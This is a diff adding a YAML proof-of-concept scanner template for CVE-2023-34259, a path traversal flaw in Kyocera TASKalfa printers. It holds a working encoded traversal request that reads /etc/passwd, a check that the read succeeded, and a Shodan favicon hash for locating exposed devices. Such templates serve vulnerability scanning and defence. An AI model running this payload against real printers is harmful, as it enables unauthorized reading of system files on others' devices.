@@ -1,0 +1,25 @@
+id: poc-yaml-kyocera-taskalfa-printer-path-traversal
+info:
+  name: Kyocera TASKalfa 打印机路径遍历漏洞(CVE-2023-34259)
+  severity: medium
+  tags:
+  - CVE-2023-34259
+  - 路径遍历
+  finger: Kyocera TASKalfa
+  shodan: http.favicon.hash:-50306417
+requests:
+- method: GET
+  path: /wlmdeu%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%00index.htm
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && !contains(body,"<")
+
+    && contains(headers,"wlmdeu")
+
+    '
+variables: {}
+transport: http
